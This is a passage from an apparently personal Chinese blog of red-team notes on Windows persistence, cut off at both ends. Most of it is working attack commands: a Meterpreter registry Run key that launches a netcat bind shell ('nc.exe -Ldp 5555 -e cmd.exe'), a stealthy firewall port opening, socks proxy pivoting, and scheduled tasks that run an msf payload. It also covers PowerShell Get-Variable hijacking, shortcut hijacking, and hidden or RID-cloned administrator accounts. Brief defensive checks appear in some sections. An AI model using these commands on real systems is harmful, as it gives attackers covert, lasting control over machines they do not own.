The registry value type (E.g. REG_SZ).</span><br><span class="line">    -v   The registry value name (E.g. Stuff).</span><br><span class="line">    -w   Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line"></span><br><span class="line">    enumkey     Enumerate the supplied registry key [-k &lt;key&gt;]</span><br><span class="line">    createkey   Create the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    deletekey   Delete the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    queryclass  Queries the class of the supplied key [-k &lt;key&gt;]</span><br><span class="line">    setval      Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]. Use a binary blob to set binary data with REG_BINARY type (e.g. setval -d ef4ba278)</span><br><span class="line">    deleteval   Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">    queryval    Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure></blockquote><p>#参数的含义 在上面都有讲</p><ol><li>上传nc</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/nc.exe C:\\windows\\system32</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252323645.png" alt="image-20220825232315482"></p><ol start="2"><li>查询注册表项</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252325723.png" alt="image-20220825232520555"></p><ol start="3"><li>设置注册表项的值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 5555 -e cmd.exe&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252326358.png" alt="image-20220825232613173"></p><ol start="4"><li>查看注册表项的值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252326060.png" alt="image-20220825232647904"></p><ol start="5"><li>&#x3D;&#x3D;关于防火墙&#x3D;&#x3D;</li></ol><p>#从外面访问内部的时候，可能会被防火墙墙掉，如果是直接关闭防火墙又太过明显，我们可以开启某个端口~~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">execute –f cmd –i –<span class="built_in">H</span></span><br><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall add portopening TCP <span class="number">5555</span> <span class="string">&quot;QQ&quot;</span> ENABLE ALL</span><br><span class="line"><span class="comment">#重启生效</span></span><br><span class="line">shutdown <span class="literal">-r</span> <span class="operator">-f</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><ol start="6"><li>msf开启socks5代理:</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ol start="7"><li>配置proxychains</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252332889.png" alt="image-20220825233232726" style="zoom: 50%;" /><ol start="8"><li>配置msf路由</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br><span class="line">run autoroute -s 192.168.1.0/24</span><br></pre></td></tr></table></figure><ol start="9"><li>通过proxychains，nc正向连接</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nc 192.168.1.132 5555</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252350917.png" alt="image-20220825235050673" style="zoom:50%;" /><h2 id="在目标-cmd-下"><a href="#在目标-cmd-下" class="headerlink" title="在目标 cmd 下"></a>在目标 cmd 下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/nc.exe C:\\windows\\system32</span><br><span class="line">shell</span><br><span class="line">reg query HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line">reg add HKLM\software\microsoft\windows\currentversion\run /v </span><br><span class="line">nc /t REG_SZ /d &quot;C:\windows\system32\nc.exe -Ldp 5555 -e cmd.exe&quot;</span><br><span class="line">reg query HKLM\software\microsoft\windows\currentversion\run /v nc</span><br><span class="line"></span><br><span class="line">execute –f cmd –i –H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall add portopening TCP 5555 &quot;QQ&quot; ENABLE ALL</span><br><span class="line">shutdown -r -f -t 0</span><br></pre></td></tr></table></figure><h1 id="schtasks计划任务-很常见"><a href="#schtasks计划任务-很常见" class="headerlink" title="schtasks计划任务 (很常见)"></a>schtasks计划任务 (很常见)</h1><h2 id="查看计划任务："><a href="#查看计划任务：" class="headerlink" title="查看计划任务："></a>查看计划任务：</h2><ul><li>taskschd.msc 调出计划任务图形界面(推荐)</li><li>schtasks &#x2F;query</li><li>cmd命令：schtasks&gt;schtasks.txt</li><li>powshell命令：Get-ScheduledTask</li><li>单击【开始】&gt;【运行】；输入 cmd，然后输入at( schtasks.exe)，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li><li>单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>创建test定时任务，每分钟执行一次5555.exe</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">1</span> /tr C:\Users\Administrator\Desktop\msf_6666_win64.exe /tn test</span><br><span class="line"><span class="comment">#删除</span></span><br><span class="line">schtasks /delete /tn test</span><br><span class="line"><span class="comment">#查询</span></span><br><span class="line">schtasks /query /tn test</span><br></pre></td></tr></table></figure><h2 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">SCHTASKS /Create /?</span><br><span class="line"></span><br><span class="line">#创建新的计划任务</span><br><span class="line">schtasks /create</span><br><span class="line">指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line"></span><br><span class="line">#频率</span><br><span class="line">/sc schedule</span><br><span class="line">指定任务在其计划类型内的运行频率。</span><br><span class="line">有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.</span><br><span class="line"></span><br><span class="line">#频率的数量</span><br><span class="line">/mo modifier</span><br><span class="line">改进计划类型以允许更好地控制计划重复周期。有效值列于下面“修改者”部分中。这个参数对于 MONTHLY 计划是必需的。对于MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">修改者: 按计划类型的 /MO 开关的有效值:</span><br><span class="line">    MINUTE:  1 到 1439 分钟。</span><br><span class="line">    HOURLY:  1 - 23 小时。</span><br><span class="line">    DAILY:   1 到 365 天。</span><br><span class="line">    WEEKLY:  1 到 52 周。</span><br><span class="line">    ONCE:    无修改者。</span><br><span class="line">    ONSTART: 无修改者。</span><br><span class="line">    ONLOGON: 无修改者。</span><br><span class="line">    ONIDLE:  无修改者。</span><br><span class="line">    MONTHLY: 1 到 12，或</span><br><span class="line">             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。</span><br><span class="line">    ONEVENT:  XPath 事件查询字符串</span><br><span class="line"></span><br><span class="line">#执行的程序或者命令    </span><br><span class="line">/tr &lt;TaskRun&gt;</span><br><span class="line">指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line"></span><br><span class="line">#指定任务的名称。</span><br><span class="line">/tn &lt;TaskName&gt;</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><blockquote><p>schtasks命令详解：<a href="https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html">https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html</a></p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#每分钟执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">1</span> /tn calc_update /tr <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#每小时执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> HOURLY /mo <span class="number">1</span> /tn calc_update /tr  <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#每天执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> DAILY /mo <span class="number">1</span> /tn calc_update /tr  <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#删除计划任务。</span></span><br><span class="line">schtasks /Delete /TN 任务名称 /F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例:</span></span><br><span class="line"><span class="comment">#比如说hexo每隔三十分钟自动更新</span></span><br><span class="line"><span class="comment">#不能同时用两次双引号怎么办？</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">30</span> /tn hexo_update /tr <span class="string">&quot;cmd /c &quot;</span>F: &amp;&amp; <span class="built_in">cd</span> F:\Haoran\桌面\myblog &amp;&amp; hexo g <span class="literal">-d</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这个命令却意外的生成了正确的计划任务</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">30</span> /tn hexo_update /tr <span class="string">&quot;cmd /c &#x27;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">#执行结果</span></span><br><span class="line"><span class="string">成功: 成功创建计划任务 &quot;hexo_update&quot;。</span></span><br><span class="line"><span class="string">#输入taskschd.msc查看计划任务</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#官方实例：</span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;doc&quot;，该机器每小时在 &quot;runasuser&quot; 用户下运行 notepad.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC HOURLY /TN doc /TR notepad</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;accountant&quot;，在指定的开始日期和结束日期之间的开始时间和结束时间内，每隔五分钟运行 calc.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务 &quot;gametime&quot;，在每月的第一个星期天运行“空当接龙”。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime /TR c:\windows\system32\freecell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;report&quot;，每个星期运行 notepad.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;logtracker&quot;，每隔五分钟从指定的开始时间到无结束时间，运行 notepad.exe。将提示输入 /RP 码。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN logtracker /TR c:\windows\system32\notepad.exe /ST 18:30 /RU runasuser /RP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务 &quot;gaming&quot;，每天从 12:00 点开始到14:00 点自动结束，运行 freecell.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00 /ET 14:00 /K</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务“EventLog”以开始运行 wevtvwr.msc只要在“系统”通道中发布事件 101</span></span><br><span class="line"><span class="string">SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT /EC System /MO *[System/EventID=101]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">==&gt; 文件路径中可以加入空格，但需要加上两组引号，一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD的外部引号必须是一对双引号；内部引号可以是一对单引号或一对转义双引号:</span></span><br><span class="line"><span class="string">SCHTASKS /Create /tr &quot;&#x27;</span>c:\program files\internet explorer\iexplorer.exe<span class="string">&#x27; \&quot;c:\log data\today.xml\&quot;&quot; ...</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209021206058.png" alt="image-20220902120649773"></p><h4 id="输入taskschd-msc查看计划任务"><a href="#输入taskschd-msc查看计划任务" class="headerlink" title="输入taskschd.msc查看计划任务"></a>输入taskschd.msc查看计划任务</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022159661.png" alt="image-20220902215958413" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022209833.png" alt="image-20220902220949582" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210135.png" alt="image-20220902221014958" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210895.png" alt="image-20220902221042649" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210792.png" alt="image-20220902221059540" style="zoom:50%;" /><h2 id="Task-Powershell"><a href="#Task-Powershell" class="headerlink" title="Task-Powershell"></a>Task-Powershell</h2><blockquote><p><a href="https://github.com/re4lity/Schtasks-Backdoor">https://github.com/re4lity/Schtasks-Backdoor</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211346068.png" alt="image-20220821134634881"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211346981.png" alt="image-20220821134647829"></p><h2 id="较新的权限维持方法"><a href="#较新的权限维持方法" class="headerlink" title="较新的权限维持方法"></a>较新的权限维持方法</h2><blockquote><p>算一个漏洞，新的机器大概率会修复，不过很多机器不一定修复</p><p>参考：<a href="https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA">计划任务启动PowerShell.exe实现持久化</a></p></blockquote><h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><p>利用PowerShell启动时执行Get-Variable执行恶意文件<br>1.将恶意程序放在<code>%APPDATA%Local\Microsoft\WindowsApps</code>目录下并重命名为<code>Get-Variable.exe</code><br>2.创建计划任务实现持久化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f tr &quot;powershell.exe -windowstyle hidden&quot;</span><br><span class="line"></span><br><span class="line">#powershell.exe -windowstyle hidden 中-windowstyle设置powershell.exe的窗口风格~~隐藏</span><br></pre></td></tr></table></figure><p>该命令创建计划任务程序COMSurrogate,该程序以隐藏的方式执行PowerShell。而执行PowerShe1l会启动恶意程序Get-Variable.exe,从而实现持久化。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>在执行powershell的时候，powershell会做一个类似在机器目录中查找环境变量的操作，会找到<code>%APPDATA%Local\Microsoft\WindowsApps</code>目录下面，如果看到该目录下面有个Get-variable.exe会默认执行~~。我们只需要将该目录下的Get-variable.exe替换为后门即可~</p><p>总结来说便是：<strong>通过运行PowerShell时触发执行Get-variable来实现攻击</strong></p><h3 id="具体原理细节："><a href="#具体原理细节：" class="headerlink" title="具体原理细节："></a>具体原理细节：</h3><p>执行PowerShell ，在Process monitor观察PowerShell 对Get-variable.exe的操作可知：</p><p>首先，PowerShell 遍历系统环境变量路径下是否存在：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058264.png" alt="图片"></p><p>然后遍历在用户环境变量路径下是否存在：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058150.png" alt="图片"></p><p>其中用户环境变量包括路径%APPDATA%\Local\Microsoft\WindowsApps：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058250.png" alt="图片"></p><p>当发现该文件时，调用该文件并使用参数Name host ValueOnly 执行:<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260059983.png" alt="图片"></p><p>该<code>Get-Variable host -ValueOnly</code>命令用于在Windows上获取主机操作系统信息，如下：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260059929.png" alt="图片"></p><p>PowerShell在启动时会尝试执行该命令获取控制台主机信息,根据控制台主机信息的配置去启动PowerShell，如中英文设置、UI设置。</p><p>因此，我们可以发现：该机制类似dll劫持，PowerShell按顺序在系统和用户的环境变量中搜索Get-variable并执行，所以将恶意文件重命名为Get-variable.exe并放置在PowerShell的搜索路径中，就可以在启动PowerShell时执行恶意文件。</p><p>而使用路径%APPDATA%\Local\Microsoft\WindowsApps的原因是：<strong>在Win10上默认的用户环境变量中存在该路径，且将文件复制进该文件夹不需要特殊权限，具有普遍性,容易利用。</strong></p><p>经过测试发现，仅有该cmdlet放置在WindowsApps下时可以触发执行。</p><h1 id="快捷方式劫持"><a href="#快捷方式劫持" class="headerlink" title="快捷方式劫持"></a>快捷方式劫持</h1><p>Windows快捷方式包含对系统上安装的软件或文件位置(网络或本地)的引用。快捷方式的文件扩展名是.LNK，它为红队提供了很多机会来执行各种格式的代码 exe、vbs、Powershell、scriptlet  等。invoke-item在powershell中就是指唤醒程序</p><p><strong>在执行快捷方式的时候 无感唤醒后门~~</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &quot;invoke-item &#x27;C:\Windows\system32\cmd.exe&#x27;; invoke-item C:\Users\Administrator\DeSsktop\msf_6666_win64.exe&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260933022.png" alt="image-20220826093326825" style="zoom: 50%;" /><h1 id="账户隐藏"><a href="#账户隐藏" class="headerlink" title="账户隐藏"></a>账户隐藏</h1><blockquote><ul><li><p>后门可能被杀软查杀，隐藏账户就很直接</p></li><li><p>lusrmgr.msc查看管理员组下有无新成员</p></li><li><p>命令行：</p></li></ul><blockquote><ul><li>wmic useraccount</li><li>net user</li><li>net localgroup administrators</li></ul></blockquote><ul><li>D盾_web查杀工具可以检查隐藏账号、克隆账号</li></ul></blockquote><ul><li>隐藏用户</li></ul><p>通过 net user  命令查看不到，但是在控制面板的管理账户界面可以查看到。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加账户</span><br><span class="line">net user 用户名 密码 /add</span><br><span class="line">#组中添加用户</span><br><span class="line">net localgroup 组 用户名 /add</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ AdminPass /add &amp;&amp; net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><ul><li>激活Guest用户</li></ul><blockquote><p>&#x2F;active:no表示禁用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user guest Admin@hacker &amp;&amp; net localgroup administrators guest /add</span><br><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure><h1 id="RID劫持-隐蔽性好-克隆账户"><a href="#RID劫持-隐蔽性好-克隆账户" class="headerlink" title="RID劫持 (隐蔽性好)(克隆账户)"></a>RID劫持 (隐蔽性好)(克隆账户)</h1><blockquote><p>参考：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧-Windows系统的帐户隐藏</a></p></blockquote><p>写入注册表，创建克隆 administrator  账号，且通过命令 net user  以及<strong>控制面板中的管理账户</strong>无法看到。注意！！！控制面板中的管理账户也无法看到！！！！</p><h2 id="隐藏步骤"><a href="#隐藏步骤" class="headerlink" title="隐藏步骤"></a>隐藏步骤</h2><ol><li>用’$’创建匿名用户，并归到administrators和remote desktop users用户组（归入对应组就拥有了管理员和远程桌面的权限）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ AdminPass /add /y</span><br><span class="line">net localgroup administrators admin$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; admin$ /add</span><br></pre></td></tr></table></figure><ol start="2"><li>对注册表赋予权限</li></ol><p>默认注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改。因此需要给 Administrator  用户赋予 Sam  键值权限，默认是不允许的。现在需要为其添加管理员权限~~</p><p>右键-权限-选中Administrators，允许完全控制。如下图</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261531600.png" alt="Alt text" style="zoom:50%;" /><p>重新启动注册表regedit.exe，获得对该键值的修改权限。</p><ol start="3"><li>导出注册表</li></ol><p>在注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户admin$。获取默认类型为<code>0x3ea</code>,将注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\admin$导出为<strong>1.reg</strong></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261534789.png" alt="Alt text" style="zoom:50%;" /><p>在注册表下能够找到对应类型名称的注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>。右键将该键导出为<code>2.reg</code>。如下图</p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-5.png" alt="Alt text" style="zoom:50%;" /><p>默认情况下，管理员帐户Administrator对应的注册表键值为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>。同样，右键将该键导出为<code>3.reg</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261606001.png" alt="image-20220826160641524" style="zoom:50%;" /><ol start="4"><li>将 administrator  用户对应的 Users  中的F值复制替换后门账户的F值</li></ol><blockquote><p>注册表中的F值类似权限的意思，授予了相应的F值即具备对应权限</p></blockquote><p>将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>下键F的值替换为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即2.reg中键F的值替换成3.reg中键F的值</p><ol start="5"><li>通过命令删除刚才的后门用户</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ /del</span><br></pre></td></tr></table></figure><ol start="6"><li>通过注册表导入刚才导出的两个注册表文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regedit /s 1.reg</span><br><span class="line">regedit /s 2.reg</span><br></pre></td></tr></table></figure><p>用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。</p><p><strong>&#x3D;&#x3D;net user 或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。&#x3D;&#x3D;</strong></p><p>隐藏账户制做完成，控制面板不存在帐户test$</p><p>通过net user无法列出该帐户</p><p>计算机管理-本地用户和组-用户也无法列出该帐户</p><p>但可通过如下方式查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$</span><br></pre></td></tr></table></figure><p>无法通过<code>net user admin$ /del</code>删除该用户，提示用户不属于此组，如下图</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261544986.png" alt="Alt text"></p><h2 id="删除方法："><a href="#删除方法：" class="headerlink" title="删除方法："></a><strong>删除方法：</strong></h2><p>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(共有两处)</p><p><strong>注：</strong>工具HideAdmin能自动实现以上的创建和删除操</p><h2 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h2><ul><li>针对隐藏帐户的利用，查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</li></ul><blockquote><p> 当然，默认管理员权限无法查看，需要**&#x3D;&#x3D;分配权限或是提升至Sytem权限&#x3D;&#x3D;**</p></blockquote><ul><li>隐藏帐户的登录记录，可通过查看日志获取</li></ul><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><h3 id="复制管理员帐户Administrator"><a href="#复制管理员帐户Administrator" class="headerlink" title="复制管理员帐户Administrator"></a>复制管理员帐户Administrator</h3><p>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态</p><h3 id="复制已有帐户"><a href="#复制已有帐户" class="headerlink" title="复制已有帐户"></a>复制已有帐户</h3><p>在3389远程登录的利用上存在相同帐户的冲突关系。通过cmd开启本机的3389远程登录功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure><p>利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$。如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线</p><h3 id="新建帐户再复制"><a href="#新建帐户再复制" class="headerlink" title="新建帐户再复制"></a>新建帐户再复制</h3><p>进一步，大胆的思考。新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$。删除管理员帐户b，隐藏账户bbb$仍然有效</p><h3 id="原帐户的维持"><a href="#原帐户的维持" class="headerlink" title="原帐户的维持"></a>原帐户的维持</h3><p>再进一步。克隆帐户a的权限，建立隐藏帐户aaa$。修改帐户a的密码，隐藏帐户aaa$仍然有效</p><h1 id="启动项-文件夹启动"><a href="#启动项-文件夹启动" class="headerlink" title="启动项-文件夹启动"></a>启动项-文件夹启动</h1><blockquote><p>很容易被发现</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在每次开机或重启的时候就会运行启动文件夹下的程序（把快捷方式丢进来就好啦），和前面开机自启注册表项很类似。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#用户启动项目录路径位置</span><br><span class="line">C:\Users\&#123;UserName&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">#系统启动目录</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p></li><li><p>单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p></li><li><p>单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p></li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce </span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p></blockquote><ul><li>利用安全软件查看启动项、开机时间管理等。</li><li>组策略，运行gpedit.msc。</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261631491.png" alt="image-20220826163144164" style="zoom: 33%;" /></blockquote><ul><li>wmic startup list 检查启动项</li></ul><h1 id="服务后门"><a href="#服务后门" class="headerlink" 